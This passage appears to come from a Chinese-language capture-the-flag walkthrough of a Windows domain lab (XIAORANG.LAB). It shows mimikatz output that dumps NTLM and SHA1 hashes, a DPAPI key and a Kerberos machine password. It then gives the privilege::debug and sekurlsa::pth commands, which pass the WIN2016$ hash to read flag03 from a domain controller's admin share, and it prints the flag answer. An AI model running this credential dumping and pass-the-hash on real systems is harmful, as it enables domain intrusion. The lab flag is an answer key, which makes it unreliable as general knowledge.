             * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b
            ssp :
            credman :
    
    Authentication Id : 0 ; 996 (00000000:000003e4)
    Session           : Service from 0
    User Name         : WIN2016$
    Domain            : XIAORANG
    Logon Server      : (null)
    Logon Time        : 2023/11/7 13:17:26
    SID               : S-1-5-20
            msv :
             [00000003] Primary
             * Username : WIN2016$
             * Domain   : XIAORANG
             * NTLM     : 2e1664b283c4c7cca46e90addfe58af3
             * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f
            tspkg :
            wdigest :
             * Username : WIN2016$
             * Domain   : XIAORANG
             * Password : (null)
            kerberos :
             * Username : win2016$
             * Domain   : XIAORANG.LAB
             * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b
            ssp :
            credman :
    
    Authentication Id : 0 ; 24490999 (00000000:0175b3f7)
    Session           : RemoteInteractive from 2
    User Name         : Aldrich
    Domain            : XIAORANG
    Logon Server      : DC01
    Logon Time        : 2023/11/7 16:07:26
    SID               : S-1-5-21-3289074908-3315245560-3429321632-1105
            msv :
             [00000003] Primary
             * Username : Aldrich
             * Domain   : XIAORANG
             * NTLM     : f9cc30f8d5dea7c3e74b88fc0ebfcaa1
             * SHA1     : 6e96b49b69ef7d301d8c20804845a6564c6558ad
             * DPAPI    : 59359e5a87316c8d5d0759d96bbf6719
            tspkg :
            wdigest :
             * Username : Aldrich
             * Domain   : XIAORANG
             * Password : (null)
            kerberos :
             * Username : Aldrich
             * Domain   : XIAORANG.LAB
             * Password : (null)
            ssp :
            credman :
    
    Authentication Id : 0 ; 24467096 (00000000:01755698)
    Session           : Interactive from 2
    User Name         : DWM-2
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 2023/11/7 16:07:25
    SID               : S-1-5-90-0-2
            msv :
             [00000003] Primary
             * Username : WIN2016$
             * Domain   : XIAORANG
             * NTLM     : 2e1664b283c4c7cca46e90addfe58af3
             * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f
            tspkg :
            wdigest :
             * Username : WIN2016$
             * Domain   : XIAORANG
             * Password : (null)
            kerberos :
             * Username : WIN2016$
             * Domain   : xiaorang.lab
             * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 51 9c e6 95 90 25 ef 93     64 e5 fa c5 7f 17 ad 5b eb 7f 1c 8f 3c 0f 94 91 41 63 06 0e 42 df 0c 0f 35 b7 ec 6b fc 9d e8 f1 79 17 a3 1d 83 0c 43 e7     2a bf 85 4b
            ssp :
            credman :
    
    Authentication Id : 0 ; 995 (00000000:000003e3)
    Session           : Service from 0
    User Name         : IUSR
    Domain            : NT AUTHORITY
    Logon Server      : (null)
    Logon Time        : 2023/11/7 13:17:30
    SID               : S-1-5-17
            msv :
            tspkg :
            wdigest :
             * Username : (null)
             * Domain   : (null)
             * Password : (null)
            kerberos :
            ssp :
            credman :
    
    Authentication Id : 0 ; 997 (00000000:000003e5)
    Session           : Service from 0
    User Name         : LOCAL SERVICE
    Domain            : NT AUTHORITY
    Logon Server      : (null)
    Logon Time        : 2023/11/7 13:17:27
    SID               : S-1-5-19
            msv :
            tspkg :
            wdigest :
             * Username : (null)
             * Domain   : (null)
             * Password : (null)
            kerberos :
             * Username : (null)
             * Domain   : (null)
             * Password : (null)
            ssp :
            credman :
    
    Authentication Id : 0 ; 24451 (00000000:00005f83)
    Session           : UndefinedLogonType from 0
    User Name         : (null)
    Domain            : (null)
    Logon Server      : (null)
    Logon Time        : 2023/11/7 13:17:26
    SID               :
            msv :
             [00000003] Primary
             * Username : WIN2016$
             * Domain   : XIAORANG
             * NTLM     : 2e1664b283c4c7cca46e90addfe58af3
             * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f
            tspkg :
            wdigest :
            kerberos :
            ssp :
            credman :
    
    Authentication Id : 0 ; 999 (00000000:000003e7)
    Session           : UndefinedLogonType from 0
    User Name         : WIN2016$
    Domain            : XIAORANG
    Logon Server      : (null)
    Logon Time        : 2023/11/7 13:17:26
    SID               : S-1-5-18
            msv :
            tspkg :
            wdigest :
             * Username : WIN2016$
             * Domain   : XIAORANG
             * Password : (null)
            kerberos :
             * Username : win2016$
             * Domain   : XIAORANG.LAB
             * Password : (null)
            ssp :
            credman :
    
    ```


拿到了WIN2016$的ntlm，直接读最后一个flag
```
privilege::debug
sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:2e1664b283c4c7cca46e90addfe58af3



C:\Windows\system32>type \\172.22.8.15\c$\Users\Administrator\flag\flag03.txt
 _________               __    _                  _
|  _   _  |             [  |  (_)                / |_
|_/ | | \_|.--.   .---.  | |  __  .---.  _ .--. `| |-'
    | |   ( (`\] / /'`\] | | [  |/ /__\\[ `.-. | | |
   _| |_   `'.'. | \__.  | |  | || \__., | | | | | |,
  |_____| [\__) )'.___.'[___][___]'.__.'[___||__]\__/


Congratulations! ! !

flag03: flag{6929f1f6-dfdd-4ae0-a8f9-07c668c41ad7}
```